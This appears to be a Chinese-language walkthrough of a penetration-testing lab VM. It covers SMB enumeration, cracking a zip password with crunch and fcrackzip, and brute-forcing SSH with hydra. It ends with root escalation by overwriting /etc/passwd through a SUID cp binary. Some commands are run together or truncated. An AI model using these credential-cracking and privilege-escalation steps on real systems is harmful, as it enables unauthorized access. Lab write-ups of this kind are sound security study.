## 渗透测试方法说明：

网络扫描：netdiscover，nmap

枚举目录：浏览http服务，SMB登陆

解密：Crunch，Fcrack，Hydra

权限提升：读取/etc/passwd,获得拥有SUID的命令或文件，使用Openssl生成账户和密码hash，增加到/tmp下的passwd文件中，使用SUID的命令将passwd覆盖原系统passwd，切换到新的用户下就可以完成提权了

## 一、环境搭建

本次使用的是OracleVM VirtualBox加载虚拟机的镜像，使用同时使用VirtualBox下的kali2环境。网卡是桥接模式。

**注意：VMware和VirtualBox只能同时使用一个环境，由于两个软件都会接管部分实体硬件。比如网卡，网卡只能加载到其中一个软件中，另一个不起作用。故在测试时，使用同一个软件加载镜像。VirtualBox下的kali的硬盘大小分配25—30G就可以满足日常需求了。**

## 三、枚举信息

   如果想要获得更多的有用信息，我们就要开始枚举了。

   首先使用浏览器打开80端口，从网站中获取有用信息。如下图：

![](../Images/e5d4e7dd0fe06705f49bdacfc5e54a07.png)

  

  

   从Http服务中没有获得有用的信息，我们就要从SMB服务开始了。通过SMB服务发现共享的文件夹LOCUS\_LAN$，进入文件夹，获得共享的文件SOS.txt,msg\_horda.zip。

   Smbclient -L 192.168.

   Smbclient //192.168./LOCUS\_LAN$

   Ls

   Get msg\_horda.zip

   Get SOS.txt

![](../Images/ed1e0c8df7f2265a62b3679a82366301.png)

  

  

我们尝试打开msg\_horda.zip文件，但是msg\_horda.zip需要密码。

那么我们打开SOS.txt,文件正常打开，其中包含zip密码的提示。

![](../Images/3ad65aad303f992befd376fc0bb7a834.png)

  

  

其中\[@%%,\]为密码组成几位数的提示，密码为4位，@代表小写字母，%代表数字，“，”代表大写字母。

我们使用crunch来生成密码字典。命令如下：

Crunch4 4 -t @%%, -o wordlist

![](../Images/0df803d0cbcf9dae375016bf5d8cb351.png)

Crunch的用法参考：  

https://www.freebuf.com/sectool/170817.html

https://blog.csdn.net/qq\_42025840/article/details/81125584

  

使用fcrackzip进行破解。

原kali2 中没有fcrackzip的软件，你需要使用apt install fcrackzip来进行安装。然后使用如下命令进行破解。

Fcrackzip -D -u -v-p wordlist msg\_horda.zip

      爆破密码r44M，结果如下图：

![](../Images/df46b3a1e1a4befe2dcab120c9c54b5d.png)

  

   Fcrackzip软件的使用介绍：可以参考

https://www.cnblogs.com/Expioit/p/9129950.html

 

解压msg\_horda.zip文件，得到key.txt文件。如下图：

![](../Images/ff98c552921310cbb8e6340aa28b0e52.png)

  

      由于文件名为“key”，故此处猜测，得到的3\_d4y为密码。不排除是用户名的可能。

认为是密码，要爆破ssh的用户名和密码。

Hydra-L /usr/share/wordlists/rockyou.txt -p 3\_d4y -T4 192.168.  ssh

如下图：成功破解出用户名：marcus。

![](../Images/160568926046c8f0db416ea477bfc89f.png)  

  

使用ssh登陆，我们发现没有权限进入/etc

  

Sshmarcus@192.168

## 四、权限提升

我们使用命令强制ssh使用终端模式tty，这样将会使用管理员权限运行命令了。我们就可以访问/etc了。

Sshmarcus@192.168 -t “bash –noprofile”

Cd /etc

Pwd

![](../Images/643292030dfa57630f6d77d2bdcb3146.png)

  

  

查看passwd文件。

Catpasswd

![](../Images/d729c1a14447974296d3500a6861ea20.png)

  

  

搜索/bin下所有可读的并且拥有SUID权限的命令或文件。我们发现cp命令可以利用。

Find/bin -type f -perm -u=s 2>/dev/null

![](../Images/ef01f96c0ef5229ba33ce9ddbb21a68b.png)

  

  

我们需要在/tmp目录下制造一个新的/etc/passwd文件，并将passwd拷贝到/etc下替换原passwd文件。

使用openssl生成raj密码pass123的hash。

Opensslpasswd -1 -salt raj pass123

![](../Images/f8b8c2eea611eda9a020a0ebdf20b91a.png)

  

  

在/tmp目录下新建一个passwd文件，并把原来的passwd文件内容复制进去，然后再把新生成的hash和用户名raj等信息增加进去。之后再把新的passwd文件拷贝到/etc下。

Nanopasswd

Catpasswd |tail

Cp passwd/etc

![](../Images/b9c9d48502c7f692c3217d2eb0a9511d.png)

  

  

现在切换到新增加的用户raj下，查看是否拥有root权限，并查看/root文件夹下的文件。并查看.flag.txt

Su raj

Whoami

Cd /root

Ls -al

![](../Images/b5ee8557121fc488f5427d4350b44aff.png)

  

Cat .flag.txt

![](../Images/15ee0b946d00c1c27b05499a31104318.png)
